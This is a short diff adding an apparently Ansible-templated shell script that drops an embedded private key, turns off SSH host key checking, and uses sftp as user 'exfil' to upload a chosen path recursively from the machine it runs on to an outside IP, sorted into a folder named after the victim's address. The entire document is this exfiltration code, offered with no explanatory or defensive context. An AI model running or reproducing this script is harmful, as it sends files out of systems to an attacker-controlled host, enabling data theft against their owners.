@@ -1,0 +1,9 @@
+echo "{{ lookup('file', 'files/exfil_private_key') }}" > ./key
+
+chmod 600 ./key
+
+sftp -i ./key -o StrictHostKeyChecking=no exfil@240.77.187.160 <<EOF
+mkdir $(hostname -I)
+cd $(hostname -I)
+put -r {{ exfil_path }}
+EOF
